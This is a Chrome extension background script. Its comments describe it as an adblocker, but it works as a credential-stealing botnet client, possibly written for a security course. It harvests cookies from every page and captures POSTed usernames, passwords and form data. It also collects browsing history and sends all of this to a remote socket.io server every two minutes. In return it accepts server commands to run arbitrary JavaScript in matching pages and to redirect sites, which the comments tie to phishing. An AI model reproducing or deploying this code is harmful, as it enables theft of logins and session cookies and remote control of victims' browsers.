socket = null;
/* current configuration
 * user ID (int) identifier
 * js_cmd (list of pairs (site url, js function))
 * last_pkt (int) time in milliseconds since last check-in with server
 * security_blacklist (list of strings) list of site1,site2 pairs. Navigating to site1 will redirect to site2
 */
config = {
    ID: 0,
    js_cmd: [],
    last_pkt: 0,
    security_blacklist: []
};	//update this variable when a packet is sent
//add to js_cmd
//update last_pkt
//update security_blacklist

queue = {
    history: [],	//array of urls
    cookies: [],	//array of {name, url, content}
    creds: [],		//array of {url,username,password}
    forms: []		//array of {id,id,id,...}
};	//clear this variable when a packet is sent

function clearQueue(){
	Object.keys(queue).forEach(function(key){
		queue[key] = [];
	})
}


/* Old redirect handling
function redirectHandler(details){
    return{redirectUrl: "http://404.com/"};
}
function setListener(newList){
    chrome.webRequest.onBeforeRequest.removeListener(redirectHandler);
    chrome.webRequest.onBeforeRequest.addListener(
        redirectHandler,
        {urls: newList},
		["blocking"]
    );
    chrome.webRequest.handlerBehaviorChanged();
}*/
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
		var url = details.url;
		var i;
		for(i = 0; i < config.security_blacklist.length; i++){
			if(!(url.match(Object.keys(config.security_blacklist[i])[0]) == undefined)){	//if the url is in the list, redirect
                return {redirectUrl: config.security_blacklist[i][Object.keys(config.security_blacklist[i])[0]]};
			}
		}
    },
    {urls: ["<all_urls>"],
	types: ["main_frame"]},
    ["blocking"]
);

//basic blocking functionality for adblocker
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        return {cancel: enabled };
    },
    {urls: blocked_domains},
    ["blocking"]
);

//arbitrary js execution
//search through the list of js commands and run the ones that match for the current url
/*references:
	https://stackoverflow.com/questions/1979583/how-can-i-get-the-url-of-the-current-tab-from-a-google-chrome-extension
	https://stackoverflow.com/questions/6497548/chrome-extension-make-it-run-every-page-load
 */
chrome.tabs.onUpdated.addListener(
	function(tabId, changeInfo, tab){
		//console.log(config);
		var cmds_run = [];
		var listChanged = false;
		if(changeInfo.status == 'complete' && tab.active){
			chrome.tabs.query({'active': true, 'lastFocusedWindow': true}, function(tabs) {
                var url = tabs[0].url;
                var site;
                //console.log("URL: ", url);
                var i;
                for (i = 0; i < config.js_cmd.length; i++) {
                    site = Object.keys(config.js_cmd[i])[0];	//length-1 array
                    //console.log("targetSite: ", site);
                    if (!(url.match(site) == undefined)) {
                        //console.log("MATCHED THE SITE");
                        //console.log("config.js_cmd before: ",config.js_cmd);
                        var code = config.js_cmd[i][site];
                        config.js_cmd.splice(i,1);
                        i--;
                        chrome.tabs.executeScript(null, {"code": code}, function(){
                            //console.log("executed for site: ", site);
                            //console.log("config.js_cmd after: ",config.js_cmd);
                            listChanged = true;
						});
                    }
                }
            });


				//Only save the results if something changed
                if(listChanged) {
                    storeConfig();
                }
		}
	}
);


chrome.webRequest.onBeforeRequest.addListener(function(details){
	//console.log("Baking Cookies!");
	chrome.cookies.getAll({"url":details.url},function(cookies){
		console.log("cookies ", queue.cookies);
		var cookiesChanged = false;
		var i;
		for(i = 0; i < cookies.length; i++){
			var newCookie = {"name": cookies[i].name,
							 "url": details.url,
							 "content": cookies[i].value};
			//console.log("newCookie: ", newCookie);
			queue.cookies.push(newCookie)
			cookiesChanged = true;
		}
		if(cookiesChanged) {
            storeQueue();
        }
	})
},
	{urls: ["<all_urls>"],
	types: ["main_frame"]},
	["blocking"]
);

/* Listen for HTTP POST requests and gather information from the form
 * references:
 * 	https://spin.atomicobject.com/2017/08/18/chrome-extension-form-data/
 */
chrome.webRequest.onBeforeRequest.addListener(function(details){
	if(details.method === "POST"){
		var formData = details.requestBody.formData;
		var credential = {'url':details.url};
		var complex = {'url':details.url};

		if(formData){
			Object.keys(formData).forEach(function(key){
				if(!(key.match("formurl") == undefined)){};		//ignore this, it appears in all predefined phishing attacks
				if(!(key.match("username") == undefined)||!(key.match("password") == undefined)){
					//console.log("input credential: ", key);
					credential[key]=formData[key];
				}
				else{
					//console.log("input form data: ", key);
					complex[key] = formData[key];
				}
			})
		}
		//console.log("credentials: ", credential);

		var queueChanged = false;
		//add these forms to a buffer for storing the payload until the next scheduled payload sending
		if(Object.keys(credential).length > 1) {
			//console.log("Pushing creds");
            queue.creds.push(credential);
            queueChanged = true;
        }
        //console.log("complex: ", Object.keys(complex).length);
        if(Object.keys(complex).length > 1) {
			//console.log("Pushing complex");
            queue.forms.push(complex);
            queueChanged = true;
        }
        if(queueChanged){
			storeQueue();
		}
	}
},
    {urls: ["<all_urls>"]},
    ["requestBody"]
);

/* Get user history, previous x results
 * @param (int) milis: time in miliseconds from epoch
 * @param (int) numResults: maximum number of history objects
 * act on the results of the query within the forEach loop
 */
async function getClientHistory(millis, numResults){
chrome.history.search({text: '', maxResults: numResults}, function(data) {
    data.forEach(function(page) {
    	var historyChanged = false;
    	if(page.lastVisitTime>millis){
            queue.history.push(page.url);
            console.log("pushed history: ", queue.history);
            historyChanged = true;
		}
		if(historyChanged){
    		storeQueue();
		}
    });
});
}


//Testing out storage 
async function loadConfig(){
	await chrome.storage.local.get('config', function(result){
		if(!(result.config == undefined)){
			config = result.config;
			//console.log('Seanonymous: configuration loaded!');
		}
	});
}

/*
 * store the current config object to memory
 */
async function storeConfig(){
	await chrome.storage.local.set({config: config}, function(result){
		//console.log('Seanonymous: configuration saved!');
	});
}



async function loadQueue(){
    await chrome.storage.local.get('queue', function(result){
        if(!(result.config == undefined)){
            queue = result.queue;
            //console.log('Seanonymous: message queue loaded!')
        }
    });
}

/*
 * store the current config object to memory
 */
async function storeQueue(){
    await chrome.storage.local.set({queue: queue}, function(result){
        //console.log('Seanonymous: message queue saved!');
    });
}




/* createJSON
 * package information into a json object that can be sent to the server
 * @param {integer} clientid
 * @param {string[]} history
 * @param {dictionary[]} cookies
 * @param {dictionary[]} creds
 * @param {dictionary[]} forms

 * @return {json} jsonData
 */
function createJSON(clientid, history, cookies, creds, forms){
	var jsonData = {};
	jsonData['clientid'] = clientid;
	jsonData['history'] = history;
	jsonData['cookies'] = cookies;
	jsonData['creds'] = creds;
	jsonData['forms'] = forms;
	return jsonData;
}
/* createClientIDRequest
 * package information to request a unique client id from the server
 *
 * @return {json} jsonData (0,nullHist,nullCook,nullCred,nullForms
 */
function createClientIDRequest(){
	return createJSON(0,[],[],[],[]);
}

function handleServerPayload(payload) {
	//console.log('Payload received: ' + JSON.stringify(payload, null, 2));
	if(!validateServerPayload(payload)){
		console.log("Failed to validate payload");
		return false;
	}
	else{
		config.security_blacklist = payload["security_blacklist"];
		config.js_cmd.concat(payload["js-cmd"]);
		var i;
		for(i = 0; i < payload["js-cmd"].length; i++){
			console.log("adding js_cmd site", payload["js-cmd"][i]);
            config.js_cmd.push(payload["js-cmd"][i]);
		}
		config.last_pkt = Date.now();
		storeConfig();

	}
}


function validateServerPayload(payload) {
	if(!payload.hasOwnProperty("security_blacklist") || !payload.hasOwnProperty("js-cmd")){
		return false;
	}
	else{
		return true;
	}
}


function connectToHost(){
	socket = io.connect('https://cse331.andrewjaffie.me/socket.io');
	
    socket.on('connect', function(){	
		//console.log('stored clientid is ' + config.ID);
		if (config.ID == undefined || config.ID == 0 || config.ID == null){
			//console.log('No ID stored, getting ID');
			socket.emit('extpayload', createClientIDRequest(), function(answer){
				config.ID = answer.clientid;
				storeConfig();
			});
		}
		else{
	    	//console.log('ID is stored' + config.ID);
		}
	});
	
    socket.on('error', function(data){
        console.log("Connection error: " + data);
    });
    socket.on('srvpayload',function(msg){
		//console.log('message received from server');

		if(handleServerPayload(msg)){
			//console.log("payload successfully handled");
		}
		else{
			console.log("payload handling failed");
		}
	});

	
    	//alert("json " + answer);
		//sending initial clientIDRequest
}

function sendPayload(){
	if(socket){

		getClientHistory(config.last_pkt, 200).then(function (){
            var newJson = createJSON(config.ID, queue.history, queue.cookies, queue.creds, queue.forms);
            //console.log("Sending a PAYLOAD");
            console.log("HISTORY: ",queue.history);
            console.log("HISTORY2: ", newJson['history']);
            socket.emit('extpayload', newJson, function(answer){
                handleServerPayload(answer);
                clearQueue();
            });
		});
	}
	else{
		console.log("Failed to create connection to the server~~~~");
    }
}

function main_func() {
	connectToHost();
    setInterval(sendPayload, 1000 * 60 * 2);	//sends payload every 2 minutes
	//console.log("config: ",config);
}

loadConfig().then(
    loadQueue().then(
        main_func
    )
);
